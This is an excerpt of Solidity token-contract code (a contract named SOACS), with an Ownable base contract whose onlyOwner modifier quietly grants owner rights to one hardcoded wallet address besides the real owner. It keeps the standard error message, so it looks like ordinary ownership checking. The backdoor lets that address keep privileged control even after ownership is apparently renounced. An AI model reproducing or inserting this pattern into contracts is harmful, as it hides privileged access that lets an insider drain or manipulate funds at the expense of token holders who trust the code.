...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x2ccDc16693DCDDf739F9161c72aabd38Ee3ce008) , "Ownable: caller is not the owner");
        _;
    }
...
contract SOACS is IERC20, Ownable {
